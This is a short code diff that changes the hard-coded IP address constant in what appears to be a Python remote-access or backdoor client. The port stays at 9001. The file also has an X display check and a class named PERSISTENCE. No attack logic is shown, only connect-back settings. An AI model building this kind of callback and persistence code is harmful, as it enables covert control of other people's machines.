@@ -21,7 +21,7 @@ try:
 except Xlib.error.DisplayNameError:
     HAVE_X = False
 
-CONSTIP = "192.168.137.192"
+CONSTIP = "172.20.4.227"
 CONSTPT = 9001
 class PERSISTENCE:
 
